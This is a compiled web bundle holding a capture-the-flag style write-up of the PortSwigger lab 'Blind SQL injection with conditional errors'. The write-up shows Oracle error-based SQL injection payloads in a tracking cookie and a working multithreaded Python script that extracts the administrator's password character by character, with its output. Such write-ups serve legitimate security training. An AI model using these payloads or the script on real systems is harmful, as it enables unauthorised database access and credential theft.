"use strict";(self.webpackChunkwebsite=self.webpackChunkwebsite||[]).push([[1180],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var r=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},i=Object.keys(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(r=0;r<i.length;r++)n=i[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),u=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},c=function(e){var t=u(e.components);return r.createElement(l.Provider,{value:t},e.children)},p={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,i=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=u(n),m=a,f=d["".concat(l,".").concat(m)]||d[m]||p[m]||i;return n?r.createElement(f,o(o({ref:t},c),{},{components:n})):r.createElement(f,o({ref:t},c))}));function m(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var i=n.length,o=new Array(i);o[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var u=2;u<i;u++)o[u]=n[u];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},2136:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return u},toc:function(){return c},default:function(){return d}});var r=n(7462),a=n(3366),i=(n(7294),n(3905)),o=["components"],s={},l="Lab: Blind SQL injection with conditional errors",u={unversionedId:"PortSwigger/SQL Injection/Lab 12",id:"PortSwigger/SQL Injection/Lab 12",isDocsHomePage:!1,title:"Lab: Blind SQL injection with conditional errors",description:"Task",source:"@site/docs/PortSwigger/SQL Injection/Lab 12.md",sourceDirName:"PortSwigger/SQL Injection",slug:"/PortSwigger/SQL Injection/Lab 12",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 12",editUrl:"https://github.com/datthinh1801/Writupes/tree/main/website/docs/PortSwigger/SQL Injection/Lab 12.md",tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Lab: Blind SQL injection with conditional responses",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 11"},next:{title:"Lab: Blind SQL injection with time delays",permalink:"/Writeups/docs/PortSwigger/SQL Injection/Lab 13"}},c=[{value:"Task",id:"task",children:[]},{value:"Solution",id:"solution",children:[]}],p={toc:c};function d(e){var t=e.components,n=(0,a.Z)(e,o);return(0,i.kt)("wrapper",(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"lab-blind-sql-injection-with-conditional-errors"},"Lab: Blind SQL injection with conditional errors"),(0,i.kt)("h2",{id:"task"},"Task"),(0,i.kt)("p",null,"This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie."),(0,i.kt)("p",null,"The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message."),(0,i.kt)("p",null,"The database contains a different table called ",(0,i.kt)("inlineCode",{parentName:"p"},"users"),", with columns called ",(0,i.kt)("inlineCode",{parentName:"p"},"username")," and ",(0,i.kt)("inlineCode",{parentName:"p"},"password"),". You need to exploit the blind SQL injection vulnerability to find out the password of the ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,i.kt)("p",null,"To solve the lab, log in as the ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator")," user."),(0,i.kt)("h2",{id:"solution"},"Solution"),(0,i.kt)("p",null,"With a little bit testing, we know that the database is Oracle."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"TrackingId=rNDIHSBcCc2g31gX'+AND+(SELECT+1+FROM+dual)=1--\n")),(0,i.kt)("p",null,"When testing the payload, I found this one worked:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+1/0+ELSE+2+END+FROM+dual)=2--\n")),(0,i.kt)("p",null,"Now, let's use this to figure out the ",(0,i.kt)("inlineCode",{parentName:"p"},"administrator"),"'s password:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"'+AND+(SELECT+CASE+WHEN+(1=2)+THEN+1/0+ELSE+2+END+FROM+dual)=2--\n")),(0,i.kt)("p",null,"Firstly, find the password's length:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130166734-9a456be5-66d2-4048-b97e-b45da09ce5b8.png",alt:"image"}),"  "),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"As an error occured, the length is 20.  ")),(0,i.kt)("p",null,"Next, find each letter of the password with the following payload template:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+1/0+ELSE+2+END+FROM+dual)=2--\n'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='b')+THEN+1/0+ELSE+2+END+FROM+dual)=2--\n...\n'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='a')+THEN+1/0+ELSE+2+END+FROM+dual)=2--\n'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),2,1)='b')+THEN+1/0+ELSE+2+END+FROM+dual)=2--\n...\n")),(0,i.kt)("p",null,"Script:  "),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-python"},"import requests\nimport string\nfrom concurrent import futures\nfrom concurrent.futures import ThreadPoolExecutor\n\nURL = 'https://acf91f801fe3b0a7802cff6400700018.web-security-academy.net/filter?category=Gifts'\nalphas = list(string.ascii_lowercase)\nalphas.extend(list(string.ascii_uppercase))\nalphas.extend(list(string.digits))\n\ndef brute(i):\n    for j in alphas:\n        COOKIES =  {'TrackingId':f\"rNDIHSBcCc2g31gX'+AND+(SELECT+CASE+WHEN+(SUBSTR((SELECT+password+FROM+users+WHERE+username='administrator'),{i},1)='{j}')+THEN+1/0+ELSE+2+END+FROM+dual)=2--\",\n        'session':'zborbpfMUYHP1DUkgOtF1WID4ymPSr9G'}\n        resp = requests.get(URL, cookies=COOKIES)\n        if resp.status_code == 500:\n            return (i, j)\n\nres = []\nwith ThreadPoolExecutor(max_workers=10) as executor:\n    tasks = []\n    for i in range(1, 21):\n        tasks.append(executor.submit(brute, i))\n    for f in futures.as_completed(tasks):\n        res.append(f.result())\n\nres = sorted(res, key=lambda x: x[0])\nprint(len(res))\nprint(''.join([x[1] for x in res]))\n")),(0,i.kt)("p",null,"Run script:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"(env) PS E:\\CTF> py .\\intruder.py\n20\n8clzfepzojeclf6dg4jr\n")),(0,i.kt)("p",null,"Login:  "),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130168000-48f4fc3b-0c81-4e93-b09a-662d0b06100b.png",alt:"image"})),(0,i.kt)("p",null,(0,i.kt)("img",{parentName:"p",src:"https://user-images.githubusercontent.com/44528004/130168008-5041934d-df63-4bcd-a092-c09d464da290.png",alt:"image"})),(0,i.kt)("blockquote",null,(0,i.kt)("p",{parentName:"blockquote"},"Solved!")))}d.isMDXComponent=!0}}]);